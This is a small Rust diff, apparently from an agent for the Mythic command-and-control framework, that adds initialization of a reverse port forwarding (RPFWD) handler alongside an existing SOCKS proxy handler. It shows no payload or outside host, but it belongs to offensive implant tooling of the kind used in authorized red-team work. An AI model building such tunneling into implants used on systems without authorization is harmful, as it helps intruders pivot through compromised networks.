@@ -85,6 +85,12 @@ pub extern "C" fn run_main() {
             response_channels.to_mythic_socks_tx.clone(),
         );
 
+        // Initialize RPFWD handler
+        commands::rpfwd::initialize(
+            response_channels.from_mythic_rpfwd_rx,
+            response_channels.to_mythic_rpfwd_tx.clone(),
+        );
+
         tasks::initialize(tasks::TaskChannels {
             new_response_tx: response_channels.new_response_tx.clone(),
             send_file_to_mythic_tx: send_file_tx,
